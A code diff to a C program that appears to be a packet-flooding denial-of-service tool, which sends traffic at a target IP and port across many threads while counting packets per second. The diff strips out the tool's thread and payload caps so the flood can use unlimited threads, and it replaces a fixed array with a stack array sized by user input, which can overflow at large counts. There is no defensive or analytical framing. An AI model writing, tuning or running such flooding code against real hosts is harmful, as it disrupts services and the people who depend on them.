@@ -10,8 +10,6 @@
 
 #define SO_SNDBUF_SIZE (1024 * 1024 * 16)
 #define NON_BLOCKING 1
-#define MAX_THREADS 1024
-#define MAX_PAYLOAD 65535
 
 int pps_counter = 0;
 int mbps_counter = 0;
@@ -121,11 +119,6 @@ int main(int argc, char* argv[]) {
     char* protocol = argv[5];
     char* payload_mode = (argc > 6) ? argv[6] : "random";
 
-    if (threads > MAX_THREADS) {
-        printf("Threads limited to %d\n", MAX_THREADS);
-        threads = MAX_THREADS;
-    }
-
     printf("\033[96m[*] Target: %s:%d\n[*] Threads: %d, Size: %d, Protocol: %s, Payload: %s\033[0m\n",
            ip, port, threads, packet_size, protocol, payload_mode);
 
@@ -142,7 +135,7 @@ int main(int argc, char* argv[]) {
     pthread_create(&monitor_thread, NULL, pps_monitor, NULL);
     pthread_detach(monitor_thread);
 
-    pthread_t thread_ids[MAX_THREADS];
+    pthread_t thread_ids[threads];
 
     for (int i = 0; i < threads; i++) {
         struct thread_args* args = malloc(sizeof(struct thread_args));
